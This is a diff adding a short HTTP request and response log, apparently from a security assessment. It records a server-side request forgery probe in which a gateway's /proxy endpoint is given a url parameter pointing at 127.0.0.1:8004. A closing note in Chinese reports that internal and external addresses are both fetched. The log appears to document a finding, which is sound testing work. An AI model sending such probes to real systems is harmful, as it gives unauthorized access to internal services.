@@ -1,0 +1,16 @@
+== REQUEST ==
+GET /proxy?url=http%3A%2F%2F127.0.0.1%3A8004%2F HTTP/1.1
+Host: svc-api-gw:8002
+User-Agent: tanyin-b20-probe
+
+<html>proxy GTSSRF-03 synthetic internal fetch done</html>
+== RESPONSE ==
+status=200
+latency_ms=None
+Server: BaseHTTP/0.6 Python/3.12.14
+Date: Wed, 07 Oct 2026 12:11:39 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 58
+
+
+[note] proxy 面 url 参数直接代理回取，内网地址 200；外域亦通（w2 复核）。
